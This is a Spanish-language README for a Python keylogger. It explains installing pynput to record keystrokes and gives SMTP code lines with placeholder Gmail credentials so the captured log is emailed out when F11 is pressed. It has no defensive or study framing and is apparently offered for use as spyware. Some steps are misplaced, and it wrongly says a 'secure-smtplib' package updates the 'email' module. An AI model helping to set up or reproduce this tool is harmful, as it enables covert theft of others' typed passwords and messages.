# 📌 Instalación de Dependencias en Python

Antes de ejecutar el keylogger, asegúrate de instalar las bibliotecas necesarias.

## 📌 Requisitos

🔹 Python 3.x instalado en tu sistema.
🔹 Conexión a Internet para descargar las dependencias.

## 🚀 Instalación de Dependencias

### 1️⃣ Instalar `pynput` para Captura de Teclado

El módulo `pynput` permite registrar las teclas presionadas en el sistema. Instálalo con:

```bash
pip install pynput
```

### 2️⃣ Instalar `smtplib` y `email` para Envío de Correos

El módulo `smtplib` ya está incluido en Python, pero `email` se usa para estructurar los mensajes de correo. Se recomienda actualizar `email` con:

```bash
pip install secure-smtplib
```

### 3️⃣ Verificar Instalación

Después de instalar las dependencias, verifica que se hayan instalado correctamente ejecutando:

## ✉️ Configuración del Correo

Abre el archivo y reemplaza los siguientes valores con tu información:

```python
mensaje["From"] = "tucorreo@gmail.com"
mensaje["To"] = "destinatario@gmail.com"
server.login("tucorreo@gmail.com", "tu_contraseña")
server.sendmail("tucorreo@gmail.com", "destinatario@gmail.com", mensaje.as_string().encode('utf-8'))
```

🔹 **Usa una contraseña de aplicación en lugar de tu contraseña real para mayor seguridad.**

## ▶️ Ejecutar el Keylogger

Para iniciar el keylogger, ejecuta:

```bash
python keylogger.py
```

📌 **Presiona `F11` para enviar el registro por correo o `ESC` para salir.**


```bash
pip list | grep -E "pynput|smtplib|email"
```

Si todo está bien, ya puedes ejecutar el script sin problemas. 🚀
